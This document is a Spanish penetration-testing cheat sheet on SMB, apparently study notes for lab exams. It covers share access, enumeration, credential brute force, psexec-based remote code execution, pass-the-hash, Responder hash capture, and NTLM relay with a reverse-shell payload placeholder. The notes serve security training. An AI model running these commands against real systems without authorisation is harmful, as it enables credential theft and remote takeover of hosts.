#smb
Puede ser bastante interesante la [siguiente chuleta de SANS](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf)
## Interacción con el servicio
### Windows 
####  `[WINKEY] + [R]` 
Presionamos la combinación de teclas y ponemos la dirección del recurso compartido, ej: 
```textplain
 \\192.168.220.129\Finance\
```
#### CMD 
##### Net View - Mostrar contenido 
```powershell
net view \\dc01 /all
```
##### DIR - Mostrar contenido
```powershell
dir \\192.168.220.129\share\
```
##### Net View - Mostrar recurso compartido 
```powershell
net use \\192.168.167.72
```
##### Net Use - Mapear recurso compartido 
```powershell
# Si tenemos acceso a todo el contenido
net use n: \\192.168.220.129\C$
# Sin credenciales
net use n: \\192.168.220.129\share
# Con credenciales
net use n: \\192.168.220.129\share /user:test test
# Una vez mapeado: 
cd n: 
dir
# Desconectar el mapeo
net use n: /delete
```

#### Powershell
##### Mostrar contenido
```powershell
Get-ChildItem \\192.168.220.129\Finance\
# ls, gci y dir son alias de Get-ChildItem
```
##### Mapear contenido
Este mapeo solo persistirá en la sesión actual de powershell, el nombre del mapeo puede ser el que queramos
```powershell
# Sin credenciales
New-PSDrive -Name "SMB" -Root "\\192.168.220.129\share" -PSProvider "FileSystem"
# Con credenciales
$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\192.168.220.129\share" -PSProvider "FileSystem" -Credential $cred
# Una vez mapeado ya podremos acceder al recurso como queramos
dir SMB:
```
### Linux
#### Montar el servicio
Requiere permisos de root
##### Con credenciales en terminal
```bash
sudo mkdir /mnt/Finance
an0nio@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```
##### Con credenciales en archivo de texto
```bash
mount -t cifs //$target/Finance /mnt/Finance -o credentials=/path/credentialfile
```
El archivo de texto debería tener un contenido similar  al siguiente:
```textplain
username=plaintext
password=Password123
domain=.
```

#### Enumerar recursos compartidos 
##### nxc
```bash
nxc smb $target -u "user" -p "password" --shares
# Sin credenciales
nxc smb $target --shares -u '' -p ''
```
##### smbclient
```bash
smbclient -N -L //$target
smbclient -U=<username> -L //$target
# En dominio 
smbclient -U=<username> -W $domain -L //$target
```
##### smbmap
```bash
# Se podría obviar poner nombre de usuario y contraseña si no los conocemos
smbmap -H $target -u 'username' -p 'password'
# Con smbmap -Búsqueda recursiva
smbmap -H $target -r notes
```
#### Acceder al contenido de los recursos
##### sbmclient
```bash
smbclient -U user \\\\$target\\SHARENAME
# En dominio 
smbclient -U <username> -W $domain -L //$target
# Sin credenciales - smbclient es compatible con sintaxis Windows y Linux
smbclient //$target/SHARENAME -N
```
###### Subir contenido
```bash
smb: \> put <archivo_local>
# o varios archivos
smb: \> mput *.txt
```
###### Descargar contenido
```bash
smb: \> get <archivo_remoto>
```
###### Descargar todo el contenido de una carpeta 
```bash
# Dentro de la sesión de smb
mask ""
recurse ON
prompt OFF
cd path\to\remote\dir
lcd ../content/
mget *
```
##### smbmap
```bash
# descargar contenido
smbmap -H 10.129.14.128 --download "notes\note.txt"
# subir contenido
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```
## Footprinting del servicio
### nmap
```bash
sudo nmap 10.129.14.128 -sV -sC -p139,445
```
Comprobar si es vulnerable a Eternal Blue
```bash
sudo nmap --script smb-vuln-ms17-010 -p 445 $target
```
Combinación de varios scripts para obtener más información
```bash
nmap -p 445 --script smb-vuln-*,smb-enum-*,smb-os-discovery $target
```
Podemos mostrar algunos de los scripts de smb del siguiente modo: 
```bash
ls -1 /usr/share/nmap/scripts/smb*
```
### Recursos compartidos
[[SMB#Enumerar recursos compartidos]]
### Enumerar usuarios y grupos
#### RPC - RPCClient
```bash
#Sin credenciales
rpcclient -U '%' $target
rpcclient -U '%' -N $target # conexión anónima
# Con credenciales, supongamos username:password
rpcclient -U 'username%password' $target
# Una vez dentro
enumdomusers
queryuser 0x3e8
netshareenum
```
#### Enum4Linux
```bash
./enum4linux-ng.py $target -A -C
```
#### nxc
Ejemplo en el que intentamos enumerar usaurios en una red
```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```
#### Ejemplo descubrimiento de información en varios hosts
A partir de nmap buscamos todos los hosts que tengan el puerto 445 abierto en una subred y ejecutamos `enum4linux` sobre todos esos hosts
```bash
sudo nmap $target/24 -p445 -n -vvv -oN smbSErvice2.txt
cat smbSErvice.txt | grep open -B5 | grep report | awk '{print $5}' > hosts_SMB
cat hosts_SMB | while read host; do echo "Enumerando $host..."; enum4linux $host -A -C >> "enum4linux_192.168.173.0"; done
```
## Montar servidor SMB
[[Transferencia de archivos#Impacket-smbserver - Sin user-pass| Más info a paritr de aquí]]
### Impacket-smbserver 
```bash
#Sin credenciales
sudo impacket-smbserver share -smb2support /tmp/smbshare
# Con credenciales
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password pass
```
Crea el recurso `share`



## Ataques específicos del protocolo
### Fuerza bruta
[[Fuerza bruta#Servicios de red|Revisar aquí]]
Ejemplo nxc (en rpincipio nxc es la mejor opción específica para smb, pero se podrían utilizar otras herramientas como hydra, medusa o ncrack): 
```bash
nxc smb $target -u user.list -p passwords.list --local-auth
```
### RCE
#### psexec
Es una herramienta que nos permite ejecutar procesos en otros sistemas sin tener que instalar software de cliente manualmente. Necesitamos permisos administrativos en la máquina atacante 
Además de la herramienta de Windows(parrafo siguiente) existen varias herramientas Linux, como [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py), [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py), [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py), [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md)
#### psexec Windows
Podemos descargar PsExec desde [el sitio web de Microsoft](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
```powershell
psexec \\10.10.110.17 -u administrator -p Password123! cmd.exe
```
#### impacket-psexec
```bash
impacket-psexec administrator:'Password123!'@$target
```
#### nxc
```bash
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
### PtH
Podemos ver más información [[Credenciales en Windows#2. Pass-the-Hash (PtH)|aquí]]
```bash
nxc smb $target -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```
### Ataques de autenticación forzada
Estos ataques no están permitidos en OSCP  o similar
#### MITM - Responder
Responder emula servicios como SMB, HTTP , FTP ó LDAP. Cuando un cliente busca un nombre que no puede resolver, Responder responde ser el servidor solicitado y así captura hashes como NTMLv2
```bash
sudo responder -I eth0
```
Los hash capturados se guardan en 
```bash
/usr/share/responder/logs/Responder-Session.log
```
#### NTML Relay - impacket-ntmlrelay
Actúa como servidor falso en servicios como SMB ó HTTP y redirige las autenticaciones interceptadas en tiempo real. En el siguiente ejemplo solo captura los hashes (`-t` es la máquina que recibirá la autenticación robada)
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t $target
```
con la opción `-c` podemos ejecutar comandos. Por ejemplo: 
```bash
impacket-ntlmrelayx --no-http-server -smb2support -t $target -c 'powershell -e BASE64_REVSHELL'
```